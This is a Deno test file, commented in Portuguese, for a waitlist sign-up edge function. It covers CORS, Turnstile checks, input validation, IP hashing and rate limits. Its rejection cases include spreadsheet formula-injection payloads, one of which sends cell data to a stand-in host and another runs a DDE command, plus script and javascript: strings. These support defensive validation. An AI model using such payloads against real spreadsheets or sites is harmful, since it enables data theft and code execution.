// Testes da Edge Function da lista de espera: deno test supabase/functions
//
// Sem rede, sem variáveis de ambiente e sem disco (o deno test roda sem nenhuma permissão): o
// Supabase é um cliente falso que imita a tabela (índice único em lower(email), contagem por
// ip_hash e criado_em) e o siteverify do Turnstile é um fetch falso.
import assert from "node:assert/strict";
import {
  bancoSupabase,
  chaveDeServico,
  chaveDoLimite,
  type ClienteSupabase,
  criarTratador,
  type FiltroContagem,
  lerIp,
  LIMITE_CORPO,
  LIMITE_POR_HORA,
  type Linha,
  MENSAGENS,
  TAMANHO_MAXIMO_TOKEN,
  textoDoIp,
  validarInscricao,
} from "../lista-espera/inscricao.ts";

const ORIGEM = "https://radar.graaos.cloud";
const SEGREDO = "segredo-falso-do-teste";
const SAL = "sal-de-teste-com-32-caracteres!!";
const IP = "203.0.113.7";
// SHA-256(IP + SAL), calculado fora do Deno (hashlib do Python)
const HASH_DO_IP = "e85957bef9ff8abbf4f0e9da0ab32a326360ee5e7bbb2af18741278b9e00cd5a";
const HASH_DO_PREFIXO = "53ca6fe2ba039c68602292c1b1f581e675ed861a5e5c9f6b175cdfa9b04cecb5"; // 2001:db8:abcd:12::/64
const HASH_SEM_IP = "6182a047f6e6bc71f69a653c9b8dd3f2fa116682376ccd97e70688cc14b85b3e";
const INICIO = Date.parse("2026-10-16T12:00:00Z");
const HORA = 60 * 60 * 1000;

const VALIDA = {
  nome: "Maria da Silva",
  email: "maria.silva@cooperativa.com.br",
  empresa: "Cooperativa Agro",
  cargo: "Compradora",
  segmento: "cooperativa",
  interesses: ["alertas", "api"],
  origem: "utm_source=linkedin&utm_campaign=lancamento",
  consentimento_lgpd: true,
  turnstile: "token-do-widget",
  website: "",
};
const SUCESSO_TURNSTILE = {
  success: true,
  hostname: "radar.graaos.cloud",
  action: "lista-espera",
  challenge_ts: "2026-10-16T11:59:30Z",
  "error-codes": [],
};

// --- Supabase falso ---------------------------------------------------------------------------
type Filtro = ["eq" | "gte", string, string];
interface Consulta {
  tabela: string;
  colunas: string;
  opcoes: unknown;
  filtros: Filtro[];
}

interface Falhas {
  contagem?: string;
  insercao?: string;
  remocao?: string;
}

function supabaseFalso(agora: () => number, falhas: Falhas = {}, latencia: () => number = () => 0) {
  const linhas: (Linha & { id: string; criado_em: string })[] = [];
  const consultas: Consulta[] = [];
  const insercoes: { tabela: string; linha: Record<string, unknown>; colunas: string }[] = [];
  const remocoes: { tabela: string; filtro: [string, string] }[] = [];
  // cada ida ao banco espera um pouco (0 por padrão): com latência, pedidos simultâneos se intercalam
  const ida = <T>(fazer: () => T) => new Promise<T>((ok) => setTimeout(() => ok(fazer()), latencia()));
  const cliente: ClienteSupabase = {
    from(tabela) {
      return {
        select(colunas, opcoes) {
          const consulta: Consulta = { tabela, colunas, opcoes, filtros: [] };
          consultas.push(consulta);
          const resultado = () => {
            if (falhas.contagem) return { count: null, error: { code: falhas.contagem } };
            const casa = (linha: Record<string, unknown>) =>
              consulta.filtros.every(([op, coluna, valor]) =>
                op === "eq" ? linha[coluna] === valor : String(linha[coluna]) >= valor
              );
            const count = tabela === "lista_espera" ? linhas.filter((l) => casa({ ...l })).length : 0;
            return { count, error: null };
          };
          const filtro: FiltroContagem = {
            eq(coluna, valor) {
              consulta.filtros.push(["eq", coluna, valor]);
              return filtro;
            },
            gte(coluna, valor) {
              consulta.filtros.push(["gte", coluna, valor]);
              return filtro;
            },
            then(cumprir, rejeitar) {
              return ida(resultado).then(cumprir, rejeitar);
            },
          };
          return filtro;
        },
        insert(linha) {
          return {
            select(colunas) {
              return {
                single() {
                  return ida(() => {
                    insercoes.push({ tabela, linha: { ...linha }, colunas });
                    if (falhas.insercao) return { data: null, error: { code: falhas.insercao } };
                    // índice único lista_espera_email_unico em lower(email)
                    if (linhas.some((l) => l.email.toLowerCase() === linha.email.toLowerCase())) {
                      return { data: null, error: { code: "23505" } };
                    }
                    const id = crypto.randomUUID();
                    linhas.push({ ...linha, id, criado_em: new Date(agora()).toISOString() });
                    return { data: { id }, error: null };
                  });
                },
              };
            },
          };
        },
        delete() {
          return {
            eq(coluna, valor) {
              return ida(() => {
                remocoes.push({ tabela, filtro: [coluna, valor] });
                if (falhas.remocao) return { error: { code: falhas.remocao } };
                // a função só remove pelo id da linha que ela mesma gravou
                const i = coluna === "id" ? linhas.findIndex((l) => l.id === valor) : -1;
                if (i >= 0) linhas.splice(i, 1);
                return { error: null };
              });
            },
          };
        },
      };
    },
  };
  return { cliente, linhas, consultas, insercoes, remocoes };
}

// --- Turnstile falso ----------------------------------------------------------------------------
type RespostaSiteverify = { json: unknown } | { http: number } | "rede";

function turnstileFalso(...respostas: RespostaSiteverify[]) {
  const chamadas: { url: string; metodo: string; corpo: URLSearchParams }[] = [];
  const fetchFalso: typeof fetch = (entrada, opcoes) => {
    chamadas.push({
      url: String(entrada),
      metodo: opcoes?.method ?? "GET",
      corpo: new URLSearchParams(opcoes?.body as URLSearchParams),
    });
    const resposta = respostas[Math.min(chamadas.length, respostas.length) - 1] ?? { json: SUCESSO_TURNSTILE };
    if (resposta === "rede") return Promise.reject(new TypeError("falha de rede"));
    if ("http" in resposta) return Promise.resolve(new Response("erro", { status: resposta.http }));
    return Promise.resolve(Response.json(resposta.json));
  };
  return { fetch: fetchFalso, chamadas };
}

// --- Montagem -------------------------------------------------------------------------------
interface Opcoes {
  env?: Record<string, string | undefined>;
  semBanco?: boolean;
  falhas?: Falhas;
  turnstile?: RespostaSiteverify[];
  latencia?: () => number;
  prazoCorpoMs?: number;
}

function montar(opcoes: Opcoes = {}) {
  let agora = INICIO;
  const relogio = () => agora;
  const supabase = supabaseFalso(relogio, opcoes.falhas, opcoes.latencia);
  const turnstile = turnstileFalso(...(opcoes.turnstile ?? [{ json: SUCESSO_TURNSTILE }]));
  const logs: string[] = [];
  const env: Record<string, string | undefined> = { TURNSTILE_SECRET_KEY: SEGREDO, IP_HASH_SALT: SAL, ...opcoes.env };
  const tratar = criarTratador({
    env: (nome) => env[nome],
    banco: opcoes.semBanco ? null : bancoSupabase(supabase.cliente),
    fetch: turnstile.fetch,
    agora: relogio,
    esperar: () => Promise.resolve(),
    log: (evento, detalhes = {}, nivel = "info") => logs.push(JSON.stringify({ evento, nivel, ...detalhes })),
    prazoCorpoMs: opcoes.prazoCorpoMs,
  });
  return {
    tratar,
    supabase,
    turnstile,
    logs,
    avancar: (ms: number) => {
      agora += ms;
    },
  };
}

interface OpcoesPedido {
  origem?: string | null;
  metodo?: string;
  tipo?: string;
  ip?: string | null;
  cabecalhos?: Record<string, string>;
  bruto?: BodyInit;
}

function pedido(corpo: unknown = VALIDA, opcoes: OpcoesPedido = {}): Request {
  const cabecalhos = new Headers(opcoes.cabecalhos);
  const origem = opcoes.origem === undefined ? ORIGEM : opcoes.origem;
  if (origem !== null) cabecalhos.set("origin", origem);
  if (!cabecalhos.has("content-type")) cabecalhos.set("content-type", opcoes.tipo ?? "application/json");
  const ip = opcoes.ip === undefined ? IP : opcoes.ip;
  if (ip !== null) cabecalhos.set("cf-connecting-ip", ip);
  const metodo = opcoes.metodo ?? "POST";
  const semCorpo = ["GET", "HEAD", "OPTIONS"].includes(metodo);
  return new Request("http://localhost/functions/v1/lista-espera", {
    method: metodo,
    headers: cabecalhos,
    body: semCorpo ? undefined : opcoes.bruto ?? JSON.stringify(corpo),
  });
}

const json = async (resposta: Response) => await resposta.json() as Record<string, unknown>;

// --- CORS e método ------------------------------------------------------------------------------
Deno.test("preflight das três origens do site libera só POST com content-type", async () => {
  const { tratar } = montar();
  for (const origem of ["https://radar.graaos.cloud", "https://graaos.cloud", "https://mvsantos-dev.github.io"]) {
    const resposta = await tratar(pedido(undefined, { metodo: "OPTIONS", origem }));
    assert.equal(resposta.status, 204);
    assert.equal(resposta.headers.get("access-control-allow-origin"), origem);
    assert.equal(resposta.headers.get("access-control-allow-methods"), "POST, OPTIONS");
    assert.equal(resposta.headers.get("access-control-allow-headers"), "content-type");
    assert.equal(resposta.headers.get("vary"), "Origin");
    assert.equal(resposta.headers.get("access-control-allow-credentials"), null);
  }
});

Deno.test("outra origem, origem parecida ou sem Origin: 403 sem CORS, sem Turnstile e sem banco", async () => {
  const { tratar, turnstile, supabase } = montar();
  const origens = [
    "https://exemplo.com",
    "http://radar.graaos.cloud",
    "https://radar.graaos.cloud.exemplo.com",
    "http://graaos.cloud",
    "https://www.graaos.cloud",
    "https://graaos.cloud.exemplo.com",
    "https://graaos.cloud:8443",
    "https://mvsantos-dev.github.io.exemplo.com",
    "https://alicecullen-html.github.io", // o endereço do usuário antigo: pode ser de outra pessoa
    "https://outra-pessoa.github.io",
    "null",
    null,
  ];
  for (const origem of origens) {
    for (const metodo of ["OPTIONS", "POST"]) {
      const resposta = await tratar(pedido(VALIDA, { metodo, origem }));
      assert.equal(resposta.status, 403, `${metodo} ${origem}`);
      assert.equal(resposta.headers.get("access-control-allow-origin"), null);
      await resposta.body?.cancel();
    }
  }
  assert.equal(turnstile.chamadas.length, 0);
  assert.equal(supabase.consultas.length + supabase.insercoes.length, 0);
});

Deno.test("só POST: GET, PUT e DELETE respondem 405 com Allow", async () => {
  const { tratar, turnstile } = montar();
  for (const metodo of ["GET", "PUT", "DELETE", "PATCH"]) {
    const resposta = await tratar(pedido(VALIDA, { metodo }));
    assert.equal(resposta.status, 405, metodo);
    assert.equal(resposta.headers.get("allow"), "POST, OPTIONS");
    await resposta.body?.cancel();
  }
  assert.equal(turnstile.chamadas.length, 0);
});

// --- Configuração -----------------------------------------------------------------------------
Deno.test("sem TURNSTILE_SECRET_KEY responde 503 sem chamar o Turnstile nem o banco", async () => {
  for (const segredo of [undefined, "", "   "]) {
    const { tratar, turnstile, supabase, logs } = montar({ env: { TURNSTILE_SECRET_KEY: segredo } });
    const resposta = await tratar(pedido());
    assert.equal(resposta.status, 503);
    assert.deepEqual(await json(resposta), { ok: false, erro: "indisponivel" });
    assert.equal(resposta.headers.get("access-control-allow-origin"), ORIGEM); // a página consegue ler o erro
    assert.equal(turnstile.chamadas.length, 0);
    assert.equal(supabase.consultas.length + supabase.insercoes.length, 0);
    assert.match(logs.join("\n"), /"evento":"configuracao_incompleta".*"turnstile":false/);
  }
});

Deno.test("sem IP_HASH_SALT, com sal de menos de 32 caracteres ou sem o banco também responde 503", async () => {
  const casos: Opcoes[] = [
    { env: { IP_HASH_SALT: undefined } },
    { env: { IP_HASH_SALT: "curto" } },
    { env: { IP_HASH_SALT: "x".repeat(31) } },
    { env: { IP_HASH_SALT: ` ${"x".repeat(30)} ` } },
    { semBanco: true },
  ];
  for (const opcoes of casos) {
    const { tratar, turnstile } = montar(opcoes);
    const resposta = await tratar(pedido());
    assert.equal(resposta.status, 503, JSON.stringify(opcoes));
    await resposta.body?.cancel();
    assert.equal(turnstile.chamadas.length, 0);
  }
});

// --- Corpo do pedido ------------------------------------------------------------------------
Deno.test("corpo que não é um objeto JSON: 415 para outro tipo e 400 para JSON inválido", async () => {
  const { tratar, turnstile } = montar();
  const casos: [OpcoesPedido, number][] = [
    [{ tipo: "text/plain" }, 415],
    [{ tipo: "application/x-www-form-urlencoded", bruto: "nome=Maria" }, 415],
    [{ tipo: "application/json; charset=utf-8" }, 200],
    [{ bruto: "{nome: 'Maria'}" }, 400],
    [{ bruto: "" }, 400],
    [{ bruto: "[1, 2]" }, 400],
    [{ bruto: "null" }, 400],
    [{ bruto: new Uint8Array([0x7b, 0x22, 0xff, 0x22, 0x7d]) }, 400], // UTF-8 quebrado
  ];
  for (const [opcoes, status] of casos) {
    const resposta = await tratar(pedido(VALIDA, opcoes));
    assert.equal(resposta.status, status, JSON.stringify(opcoes));
    await resposta.body?.cancel();
  }
  assert.equal(turnstile.chamadas.length, 1); // só o caso válido chegou ao Turnstile
});

Deno.test("corpo acima do limite: 413, pelo Content-Length ou lendo o fluxo", async () => {
  const { tratar, turnstile } = montar();
  const grande = JSON.stringify({ ...VALIDA, cargo: "x".repeat(LIMITE_CORPO) });
  const pelaDeclaracao = await tratar(pedido(VALIDA, { cabecalhos: { "content-length": String(LIMITE_CORPO + 1) } }));
  assert.equal(pelaDeclaracao.status, 413);
  await pelaDeclaracao.body?.cancel();
  const fluxo = new ReadableStream<Uint8Array>({
    start(controle) {
      const bytes = new TextEncoder().encode(grande);
      for (let i = 0; i < bytes.length; i += 1024) controle.enqueue(bytes.slice(i, i + 1024));
      controle.close();
    },
  });
  const pelaLeitura = await tratar(pedido(VALIDA, { bruto: fluxo }));
  assert.equal(pelaLeitura.status, 413);
  await pelaLeitura.body?.cancel();
  assert.equal(turnstile.chamadas.length, 0);
});

// --- Isca -----------------------------------------------------------------------------------
Deno.test("isca preenchida: 200 igual ao sucesso, sem Turnstile e sem gravar", async () => {
  const { tratar, turnstile, supabase, logs } = montar();
  for (const website of ["https://spam.example", " ", 0, true, ["x"]]) {
    const resposta = await tratar(pedido({ ...VALIDA, website, turnstile: undefined }));
    assert.equal(resposta.status, 200);
    assert.deepEqual(await json(resposta), { ok: true });
  }
  assert.equal(turnstile.chamadas.length, 0);
  assert.equal(supabase.consultas.length + supabase.insercoes.length, 0);
  assert.match(logs[0], /isca_preenchida/);
});

// --- Validação --------------------------------------------------------------------------------
Deno.test("normaliza os campos antes de gravar", async () => {
  const { tratar, supabase } = montar();
  const resposta = await tratar(pedido({
    ...VALIDA,
    nome: "  José   da\tSilva\n ", // "é" decomposto, espaços, tab e quebra de linha
    email: "  Maria.Silva@Cooperativa.COM.br ",
    empresa: "   ",
    cargo: undefined,
    interesses: ["mcp", "alertas", "mcp", "api"],
    origem: "utm_source=linkedin&utm_campaign=post alertas",
  }));
  assert.equal(resposta.status, 200);
  assert.deepEqual(supabase.linhas.map(({ criado_em: _, id: _id, ...linha }) => linha), [{
    nome: "José da Silva",
    email: "maria.silva@cooperativa.com.br",
    empresa: null,
    cargo: null,
    segmento: "cooperativa",
    interesses: ["alertas", "api", "mcp"], // sem repetição, na ordem da constraint
    origem: "utm_source=linkedin&utm_campaign=post alertas",
    consentimento_lgpd: true,
    ip_hash: HASH_DO_IP,
  }]);
});

Deno.test("nome: de 2 a 120 caracteres contados como o char_length do Postgres", () => {
  const nome = (valor: unknown) => validarInscricao({ ...VALIDA, nome: valor });
  assert.equal(nome("Jo").ok, true);
  assert.equal(nome("J").ok, false);
  assert.equal(nome("  J  ").ok, false);
  assert.equal(nome("a".repeat(120)).ok, true);
  assert.equal(nome("a".repeat(121)).ok, false);
  assert.equal(nome("Jo" + "😀".repeat(118)).ok, true); // 120 pontos de código (238 unidades UTF-16)
  assert.equal(nome("Jo" + "😀".repeat(119)).ok, false); // 121
  assert.equal(nome("é".repeat(120)).ok, true); // 240 antes do NFC, 120 depois
  const vazio = nome("");
  assert.equal(vazio.ok, false);
  if (!vazio.ok) assert.equal(vazio.campos.nome, MENSAGENS.nomeVazio);
  for (const invalido of [undefined, null, 42, ["Maria"], { nome: "Maria" }]) {
    assert.equal(nome(invalido).ok, false, JSON.stringify(invalido));
  }
});

Deno.test("e-mail: padrão da constraint, até 254, e nada que nenhum endereço real tenha", () => {
  const email = (valor: unknown) => validarInscricao({ ...VALIDA, email: valor });
  const validos = [
    "a@b.co",
    "nome.sobrenome+radar@empresa.com.br",
    "x_y-z%1@sub.dominio-agro.coop",
    `${"a".repeat(64)}@${"b".repeat(185)}.com`, // 254
  ];
  for (const valor of validos) assert.equal(email(valor).ok, true, valor);
  const invalidos = [
    "",
    "sem-arroba",
    "a@b",
    "a@b.c",
    "a@b.c0",
    "a@@b.com",
    "a b@c.com",
    '"a"@b.com',
    "a@b.com.",
    ".a@b.com",
    "a.@b.com",
    "a..b@c.com",
    "a@-b.com",
    "a@b-.com",
    "a@b..com",
    "joão@empresa.com.br",
    "a@empresá.com",
    "Kelvin@b.com", // o K de Kelvin viraria "k" ao passar para minúsculas
    "a@b\n.com",
    `${"a".repeat(65)}@b.com`,
    `${"a".repeat(64)}@${"b".repeat(186)}.com`, // 255
    42,
    ["a@b.com"],
  ];
  for (const valor of invalidos) assert.equal(email(valor).ok, false, JSON.stringify(valor));
});

Deno.test("empresa e cargo: opcionais, até 160 e 120 caracteres", () => {
  const com = (extra: Record<string, unknown>) => validarInscricao({ ...VALIDA, ...extra });
  assert.equal(com({ empresa: "e".repeat(160), cargo: "c".repeat(120) }).ok, true);
  assert.equal(com({ empresa: "e".repeat(161) }).ok, false);
  assert.equal(com({ cargo: "c".repeat(121) }).ok, false);
  const vazios = com({ empresa: null, cargo: "" });
  assert.equal(vazios.ok, true);
  if (vazios.ok) assert.deepEqual([vazios.dados.empresa, vazios.dados.cargo], [null, null]);
  assert.equal(com({ empresa: 123 }).ok, false);
  assert.equal(com({ empresa: "Silva & Filhos Ltda." }).ok, true);
});

Deno.test("invisíveis, tags Unicode, acentos empilhados, links e < > (também largos ou decompostos) são recusados", () => {
  const ruins = [
    "Maria\u0000",
    "Maria\u001b[31m",
    "Maria\u202eacilam",
    "Ma\u200bria",
    "Maria\u2066x\u2069",
    "Maria \ue000",
    "Maria \ud800",
    "\u3164\u3164", // hangul filler: parece vazio
    "\u00ad\u00ad", // hífen suave
    "Ana\u200e\u200f",
    "Ana\u{e0069}\u{e0067}\u{e006e}", // tags Unicode: texto escondido
    "Ana\ufe0f",
    "a\u0301\u0302\u0303\u0304", // acentos empilhados (zalgo)
    "\u00e1\u0302\u0303\u0304", // o mesmo, com o primeiro já composto
    "<b>Maria</b>",
    "\uff1cscript\uff1e", // < > largos
    "\u226eimg\u226f", // viram < e > sem o acento
    "Maria https://golpe.exemplo",
    "https\uff1a\uff0f\uff0fgolpe.exemplo", // :// largo
    "Visite www.golpe.exemplo",
    "javascript:alert(1)",
  ];
  for (const texto of ruins) {
    for (const nomeCampo of ["nome", "empresa", "cargo"]) {
      assert.equal(
        validarInscricao({ ...VALIDA, [nomeCampo]: texto }).ok,
        false,
        `${nomeCampo}: ${JSON.stringify(texto)}`,
      );
    }
  }
  // o que é de verdade continua valendo
  for (const texto of ["José Antônio", "Ngô Bảo Châu", "Nguyễn Thị Ánh", "李明", "D'Ávila & Filhos", "3M", "TI"]) {
    assert.equal(validarInscricao({ ...VALIDA, empresa: texto }).ok, true, texto);
  }
});

Deno.test("começo de fórmula de planilha (= + - @) é recusado em nome, empresa e cargo", () => {
  const formulas = [
    '=IMPORTXML(CONCAT("https:","//golpe.exemplo/?d=",C2:C999),"//a")',
    '=HYPERLINK("golpe.com.br/pix","Confirme")',
    "=cmd|' /C calc'!A0",
    "+SUM(1,2)",
    "-2+3",
    "@SUM(A1)",
    "\uff1dSUM(A1)", // = largo
  ];
  for (const texto of formulas) {
    for (const nomeCampo of ["nome", "empresa", "cargo"]) {
      const resultado = validarInscricao({ ...VALIDA, [nomeCampo]: texto });
      assert.equal(resultado.ok, false, `${nomeCampo}: ${texto}`);
      if (!resultado.ok) assert.ok(Object.values(resultado.campos).length > 0);
    }
  }
  const formula = validarInscricao({ ...VALIDA, nome: "=SOMA(A1)" });
  if (!formula.ok) assert.equal(formula.campos.nome, MENSAGENS.formula);
});

Deno.test("nome precisa de letras; empresa e cargo, de letra ou número", () => {
  for (const nome of ["..", "12", "--", "\u0301\u0301"]) {
    assert.equal(validarInscricao({ ...VALIDA, nome }).ok, false, nome);
  }
  assert.equal(validarInscricao({ ...VALIDA, empresa: "..." }).ok, false);
  assert.equal(validarInscricao({ ...VALIDA, cargo: "TI" }).ok, true);
});

Deno.test("origem só no formato utm_source=…&utm_campaign=…; fora dele, fica de fora", () => {
  const valida = (origem: unknown) => {
    const r = validarInscricao({ ...VALIDA, origem });
    assert.equal(r.ok, true, JSON.stringify(origem));
    return r.ok ? r.dados.origem : undefined;
  };
  assert.equal(valida("utm_source=linkedin&utm_campaign=lancamento"), "utm_source=linkedin&utm_campaign=lancamento");
  assert.equal(valida("utm_source=linkedin"), "utm_source=linkedin");
  assert.equal(valida("utm_campaign=post-1"), "utm_campaign=post-1");
  for (
    const ruim of [
      "",
      "source=linkedin",
      "utm=x",
      "utm_campaign=x&utm_source=y",
      "utm_source=x&utm_source=y",
      "utm_source=x&utm_campaign=y&utm_medium=z",
      "utm_source=javascript:location=name",
      "utm_source=https://golpe.exemplo",
      "utm_source=<script>",
      `utm_source=${"x".repeat(81)}`,
      "utm_source=",
      42,
      null,
    ]
  ) {
    assert.equal(valida(ruim), null, JSON.stringify(ruim));
  }
});

Deno.test("segmento e interesses só das listas fixas; consentimento só true", () => {
  const com = (extra: Record<string, unknown>) => validarInscricao({ ...VALIDA, ...extra });
  for (
    const segmento of [
      "revenda",
      "cooperativa",
      "trading",
      "industria",
      "logistica",
      "consultoria",
      "produtor",
      "outro",
    ]
  ) {
    assert.equal(com({ segmento }).ok, true, segmento);
  }
  for (const segmento of [undefined, "", "Revenda", " revenda", "indústria", "admin", ["revenda"], 1]) {
    assert.equal(com({ segmento }).ok, false, JSON.stringify(segmento));
  }
  assert.equal(com({ interesses: [] }).ok, true);
  assert.equal(com({ interesses: undefined }).ok, true);
  for (const interesses of ["alertas", ["alertas", "spam"], [null], ["ALERTAS"], { 0: "api" }, Array(11).fill("api")]) {
    assert.equal(com({ interesses }).ok, false, JSON.stringify(interesses));
  }
  for (const consentimento_lgpd of [false, "true", 1, null, undefined]) {
    const resultado = com({ consentimento_lgpd });
    assert.equal(resultado.ok, false, JSON.stringify(consentimento_lgpd));
    if (!resultado.ok) assert.equal(resultado.campos.consentimento_lgpd, MENSAGENS.consentimento);
  }
});

Deno.test("erro de campo: 422 com as mensagens, antes do Turnstile (o token não se perde)", async () => {
  const { tratar, turnstile, supabase } = montar();
  const resposta = await tratar(pedido({ ...VALIDA, nome: "M", email: "maria@", consentimento_lgpd: false }));
  assert.equal(resposta.status, 422);
  assert.deepEqual(await json(resposta), {
    ok: false,
    erro: "campos",
    campos: {
      nome: MENSAGENS.nomeTamanho,
      email: MENSAGENS.emailFormato,
      consentimento_lgpd: MENSAGENS.consentimento,
    },
  });
  assert.equal(turnstile.chamadas.length, 0);
  assert.equal(supabase.insercoes.length, 0);
});

// --- Turnstile ------------------------------------------------------------------------------
Deno.test("sem token ou token maior que o limite: 403 sem chamar o siteverify", async () => {
  const { tratar, turnstile } = montar();
  for (const token of [undefined, "", 42, ["t"], "t".repeat(TAMANHO_MAXIMO_TOKEN + 1)]) {
    const resposta = await tratar(pedido({ ...VALIDA, turnstile: token }));
    assert.equal(resposta.status, 403);
    assert.deepEqual(await json(resposta), { ok: false, erro: "verificacao" });
  }
  assert.equal(turnstile.chamadas.length, 0);
});

Deno.test("manda secret, response e idempotency_key ao siteverify, sem o IP", async () => {
  const { tratar, turnstile } = montar();
  const resposta = await tratar(pedido());
  assert.equal(resposta.status, 200);
  await resposta.body?.cancel();
  assert.equal(turnstile.chamadas.length, 1);
  const [chamada] = turnstile.chamadas;
  assert.equal(chamada.url, "https://challenges.cloudflare.com/turnstile/v0/siteverify");
  assert.equal(chamada.metodo, "POST");
  assert.equal(chamada.corpo.get("secret"), SEGREDO);
  assert.equal(chamada.corpo.get("response"), VALIDA.turnstile);
  assert.match(chamada.corpo.get("idempotency_key") ?? "", /^[0-9a-f-]{36}$/);
  // o IP não vai para a Cloudflare: quem alterna IPv4 e IPv6 seria recusado sem motivo
  assert.deepEqual([...chamada.corpo.keys()].sort(), ["idempotency_key", "response", "secret"]);
});

Deno.test("token recusado, ou de outro hostname ou action: 403 sem tocar no banco", async () => {
  const casos: RespostaSiteverify[] = [
    { json: { success: false, "error-codes": ["invalid-input-response"] } },
    { json: { success: false, "error-codes": ["timeout-or-duplicate"] } },
    { json: { ...SUCESSO_TURNSTILE, hostname: "golpe.exemplo" } },
    { json: { ...SUCESSO_TURNSTILE, hostname: "alicecullen-html.github.io" } }, // Pages do usuário antigo
    { json: { ...SUCESSO_TURNSTILE, hostname: undefined } },
    { json: { ...SUCESSO_TURNSTILE, action: "outro-formulario" } },
    { json: { ...SUCESSO_TURNSTILE, success: "true" } },
  ];
  for (const caso of casos) {
    const { tratar, supabase } = montar({ turnstile: [caso] });
    const resposta = await tratar(pedido());
    assert.equal(resposta.status, 403, JSON.stringify(caso));
    assert.deepEqual(await json(resposta), { ok: false, erro: "verificacao" });
    assert.equal(supabase.consultas.length + supabase.insercoes.length, 0);
  }
  // o widget dos três sites passa
  for (const hostname of ["radar.graaos.cloud", "graaos.cloud", "mvsantos-dev.github.io"]) {
    const { tratar } = montar({ turnstile: [{ json: { ...SUCESSO_TURNSTILE, hostname } }] });
    const resposta = await tratar(pedido());
    assert.equal(resposta.status, 200, hostname);
    await resposta.body?.cancel();
  }
});

Deno.test("sem resposta, 5xx ou internal-error: repete uma vez com a mesma idempotency_key", async () => {
  const falhas: RespostaSiteverify[] = ["rede", { http: 502 }, {
    json: { success: false, "error-codes": ["internal-error"] },
  }];
  for (const falha of falhas) {
    const recupera = montar({ turnstile: [falha, { json: SUCESSO_TURNSTILE }] });
    const ok = await recupera.tratar(pedido());
    assert.equal(ok.status, 200, JSON.stringify(falha));
    await ok.body?.cancel();
    const [primeira, segunda] = recupera.turnstile.chamadas;
    assert.equal(recupera.turnstile.chamadas.length, 2);
    assert.equal(primeira.corpo.get("idempotency_key"), segunda.corpo.get("idempotency_key"));

    const persiste = montar({ turnstile: [falha, falha] });
    const indisponivel = await persiste.tratar(pedido());
    assert.equal(indisponivel.status, 503, JSON.stringify(falha));
    assert.deepEqual(await json(indisponivel), { ok: false, erro: "indisponivel" });
    assert.equal(persiste.turnstile.chamadas.length, 2);
    assert.equal(persiste.supabase.insercoes.length, 0);
  }
});

Deno.test("segredo recusado pela Cloudflare ou resposta 4xx: 503 sem repetir", async () => {
  const casos: RespostaSiteverify[] = [
    { json: { success: false, "error-codes": ["invalid-input-secret"] } },
    { json: { success: false, "error-codes": ["missing-input-secret"] } },
    { http: 400 },
  ];
  for (const caso of casos) {
    const { tratar, turnstile, logs } = montar({ turnstile: [caso] });
    const resposta = await tratar(pedido());
    assert.equal(resposta.status, 503, JSON.stringify(caso));
    await resposta.body?.cancel();
    assert.equal(turnstile.chamadas.length, 1);
    assert.ok(logs.some((l) => l.includes('"nivel":"erro"') || l.includes('"nivel":"aviso"')));
  }
});

// --- IP, hash e limite por hora ------------------------------------------------------------
Deno.test("ip_hash = SHA-256(IP + IP_HASH_SALT) em hexadecimal; sem IP, um balde só", async () => {
  const comIp = montar();
  await (await comIp.tratar(pedido())).body?.cancel();
  assert.equal(comIp.supabase.linhas[0].ip_hash, HASH_DO_IP);
  assert.equal(comIp.supabase.linhas[0].ip_hash.length, 64);

  const semIp = montar();
  await (await semIp.tratar(pedido(VALIDA, { ip: null }))).body?.cancel();
  assert.equal(semIp.supabase.linhas[0].ip_hash, HASH_SEM_IP);
  assert.equal(semIp.turnstile.chamadas[0].corpo.get("remoteip"), null);
  assert.match(semIp.logs.join("\n"), /"evento":"sem_ip"/);
});

Deno.test("IP: CF-Connecting-IP, depois X-Real-IP; o X-Forwarded-For, que o cliente escreve, não conta", async () => {
  // em cada caso, só o cabeçalho certo tem o IP; se outro fosse lido, o hash seria outro
  const casos: [Record<string, string>, string][] = [
    [{ "cf-connecting-ip": IP, "x-real-ip": "198.51.100.1", "x-forwarded-for": "192.0.2.9" }, HASH_DO_IP],
    [{ "x-real-ip": IP, "x-forwarded-for": "192.0.2.9" }, HASH_DO_IP],
    [{ "cf-connecting-ip": "nao-e-ip", "x-real-ip": IP }, HASH_DO_IP], // inválido é ignorado
    [{ "cf-connecting-ip": "203.000.113.007" }, HASH_DO_IP], // zeros à esquerda
    [{ "x-forwarded-for": `${IP}, 172.16.0.1` }, HASH_SEM_IP], // só o XFF: um balde só
  ];
  for (const [cabecalhos, esperado] of casos) {
    const { tratar, supabase, logs } = montar();
    await (await tratar(pedido(VALIDA, { ip: null, cabecalhos }))).body?.cancel();
    assert.equal(supabase.linhas[0].ip_hash, esperado, JSON.stringify(cabecalhos));
    if (!cabecalhos["cf-connecting-ip"] || cabecalhos["cf-connecting-ip"] === "nao-e-ip") {
      assert.match(logs.join("\n"), /"evento":"(ip_sem_cloudflare|sem_ip)"/);
    }
  }
  // XFF trocado a cada envio não abre baldes novos
  const { tratar, supabase } = montar();
  const status = [];
  for (let n = 1; n <= LIMITE_POR_HORA + 2; n++) {
    const resposta = await tratar(
      pedido({ ...VALIDA, email: `xff${n}@empresa.com.br` }, {
        ip: null,
        cabecalhos: { "x-forwarded-for": `10.${n}.${n}.${n}` },
      }),
    );
    status.push(resposta.status);
    await resposta.body?.cancel();
  }
  assert.deepEqual(status, [200, 200, 200, 429, 429]);
  assert.equal(supabase.linhas.length, LIMITE_POR_HORA);
});

Deno.test("leitura do IP: IPv6 conta pelo prefixo /64 e IPv4 mapeado vira IPv4", () => {
  const chave = (texto: string) => chaveDoLimite(lerIp(texto));
  assert.equal(chave("2001:db8:abcd:12::1"), "2001:db8:abcd:12::/64");
  assert.equal(chave("2001:0DB8:ABCD:0012:ffff:1:2:3"), "2001:db8:abcd:12::/64");
  assert.equal(chave("2001:db8:abcd:13::1"), "2001:db8:abcd:13::/64");
  assert.equal(chave("::ffff:203.0.113.7"), IP);
  assert.equal(chave("::ffff:cb00:7107"), IP);
  assert.equal(chave("fe80::1%eth0"), "fe80:0:0:0::/64");
  assert.equal(textoDoIp(lerIp("2001:db8::1")!), "2001:db8:0:0:0:0:0:1");
  for (
    const ruim of [
      "",
      "1.2.3",
      "1.2.3.256",
      "1.2.3.4.5",
      "2001:db8::1::2",
      "2001:db8:1:2:3:4:5:6:7",
      "1.2.3.4::",
      "g::1",
      "[2001:db8::1]",
    ]
  ) {
    assert.equal(lerIp(ruim), null, ruim);
  }
  assert.equal(chaveDoLimite(null), "sem-ip");
});

